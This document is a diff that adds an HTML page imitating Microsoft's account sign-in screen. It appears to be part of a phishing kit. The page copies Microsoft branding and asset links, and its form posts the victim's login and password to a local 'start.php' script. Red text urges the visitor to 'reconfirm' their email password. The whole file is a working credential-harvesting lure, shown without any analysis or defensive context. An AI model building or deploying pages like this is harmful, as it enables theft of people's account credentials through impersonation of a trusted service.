@@ -1,0 +1,96 @@
+<html xmlns='http://www.w3.org/1999/xhtml'>
+
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/favicon_a.ico">
+
+
+    <link href="./data_files/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
+</head>
+
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb ltr" style="display: block;">
+    
+    <div>
+        <div data-bind="component:{name: &#39;background-image&#39;, publicMethods: backgroundControlMethods}">
+            <div class="background" role="presentation" data-bind="css:{app: isAppBranding}, style:{background: backgroundStyle}">
+                <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div>
+                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div>
+                <div class="background-overlay"></div>
+            </div>
+        </div>
+        <form id="i0281" method="post" action="start.php">
+            <div class="outer" data-bind="component:{name: &#39;page&#39;, params:{serverData: svr, showButtons: svr.fShowButtons, showFooterLinks: true, useWizardBehavior: svr.fUseWizardBehavior, handleWizardButtons: false, password: password, hideFromAria: ariaHidden}, event:{footerAgreementClick: footer_agreementClick}}">
+                <div class="middle">
+                    <div class="inner" data-bind="css:{&#39;app&#39;: $loginPage.backgroundLogoUrl()}">
+                        <div data-bind="component:{name: &#39;logo-control&#39;, params:{isChinaDc: svr.fIsChinaDc, bannerLogoUrl: $loginPage.bannerLogoUrl()}}"> <img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="./data_files/microsoft_logo.svg"> </div>
+                        <div data-bind=" css:{&#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;)}, component:{name: &#39;pagination-control&#39;, publicMethods: paginationControlMethods, params:{initialViewId: initialViewId, currentViewId: currentViewId, initialSharedData: initialSharedData, initialError: $loginPage.getServerError()}, event:{cancel: paginationControl_onCancel}}">
+                            <div data-bind="css:{&#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back}" class="animate">
+                                <div data-viewid="2" >
+                                    <input type="hidden" name="login" value="">
+                                    <input  type="text" name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+                                    <div data-bind="component:{name: &#39;identity-banner-control&#39;, params:{pawnIconId: svr.iPawnIcon, displayName: displayName}}">
+                                        <div class="identityBanner" >
+                                           <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title=">
+										</div> 
+                                            <div class="profile-photo"> <img role="presentation" src="Sign%20in%20to%20your%20Microsoft%20account_files/picker_account_msa.svg"> </div>
+                                        </div>
+                                    </div>
+                                    <div id="loginHeader" class="row text-title" role="heading" >Enter password</div>
+                                    <div class="row"><br>
+									<span style="color: red;">Please Reconfirm Your Email Password. </span><br style="color: red;">
+<span style="color: red;">Make Sure its Accurate</span>, <a class="display-inline-block"
+ id="idA_IL_ForgotPassword0"
+ href="#">reset
+it now.</a>
+
+                                        <div class="form-group col-md-24">
+                                                                                    <div class="placeholderContainer" data-bind="component:{name: &#39;placeholder-textbox&#39;, params:{serverData: svr, textInput: password, hasFocus: isFocused, hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;], forcePlaceholderAttribute: true, hintCss: &#39;placeholder&#39;}}">
+                                                <input required name="pass" type="password" id="i0118" autocomplete="off" class="form-control " aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password" maxlength="127"> </div>
+                                        </div>
+                                    </div>
+                                    <div class="row">
+                                        <div>
+                                            <div class="col-xs-24 form-group no-padding-left-right" >
+                                                <div class="col-xs-12 secondary">
+                                                    <input type="button" id="idBtn_Back" class="btn btn-block" value="Back"> </div>
+                                                <div class="col-xs-12 primary">
+                                                    <input type="submit" class="btn btn-block btn-primary" value="Sign in"> </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.fLockUsername &amp;&amp; !showHip">
+                                        <label id="idLbl_PWD_KMSI_Cb">
+                                            <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep me signed in</span> </label>
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-md-24">
+                                            <div class="text-13">
+                                                <div class="form-group no-margin-bottom" data-bind="css:{&#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink}"> <a id="idA_PWD_ForgotPassword" href="#" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.urlResetPassword, click: resetPassword_onClick">Forgot my password</a> </div>
+                                                <div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display: none;"> <a id="i1668" data-bind="text: str[&#39;CT_FED_STR_ChangeUserLink_Text&#39;], href: svr.urlSwitch">Sign in with another account</a> </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+            
+            <div id="footer">
+                <div data-bind="component:{name: &#39;footer-control&#39;, params:{serverData: svr, showLinks: true}, event:{agreementClick: footer_agreementClick}}">
+                    <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">© 2017 Microsoft</span> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; Cookies</a> </div>
+                </div>
+            </div>
+        </form>
+        <form method="post" target="_top"> </form>
+    </div>
+    <iframe id="idPartnerPL" height="0" width="0" src="./data_files/Prefetch.html" style="display: none;"></iframe>
+</body>
+
+</html>
